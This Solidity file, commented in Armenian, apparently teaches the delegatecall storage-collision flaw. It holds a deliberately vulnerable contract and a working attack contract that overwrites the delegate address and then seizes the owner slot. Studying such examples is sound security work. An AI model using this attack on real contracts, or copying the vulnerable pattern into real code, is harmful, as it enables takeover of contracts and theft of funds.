0,0 +1,59 @@
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
// chbrnelu hetevanqov hac.k a arvum
contract Hack {
    address public otherContract;
    address public owner;

    MyContract public toHack;

    constructor(address _to) {
        toHack = MyContract(_to);
    }
//other kontract enq tanum
    function attack() external {
        toHack.delCallGetData(uint(uint160(address(this)))); //ktrum enq 160 bit u timstampi poxaren ogtvelov sxal layoutic mer hascen dnum enq owneri mej u tanum
        toHack.delCallGetData(0);//erkrord qayl 
    }

    function getData(uint _timestamp) external payable {
        owner = msg.sender;
    }
}

contract MyContract {
    //piti nayel vor takiny delagate arvogh hertakanutyan het chetki brni : sloter
    uint public at;
    address public sender;
    uint public amount;

    address public otherContract;
    address public owner; //ays owneri nshanakutyunn enq karoghanum poxel u kontracty goghanal

    constructor(address _otherContract) {
        otherContract = _otherContract;
        owner = msg.sender;
    }

    function delCallGetData(uint timestamp) external payable {
 //delegate anelu ogtagorcvum a ayl contracti funkcianery u popxakannery ays contracti kontextum
        (bool success, ) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
        );
        require(success, "failed!");
    }
}

contract AnotherContract {
    uint public at;
    address public sender;
    uint public amount;

    event Received(address sender, uint value);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        amount = msg.value;
        emit Received(msg.sender, msg.value);
    }
}